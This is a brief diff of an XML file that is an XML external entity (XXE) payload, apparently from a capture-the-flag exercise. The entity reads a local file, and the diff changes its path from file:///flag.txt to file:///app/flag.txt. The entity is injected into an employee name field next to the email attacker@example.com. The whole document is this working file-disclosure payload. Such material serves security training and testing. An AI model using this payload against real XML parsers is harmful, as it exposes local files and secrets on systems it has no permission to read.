@@ -1,5 +1,5 @@
 <?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt"> ]>
 <employee>
   <name>&xxe;</name>
   <email>attacker@example.com</email>
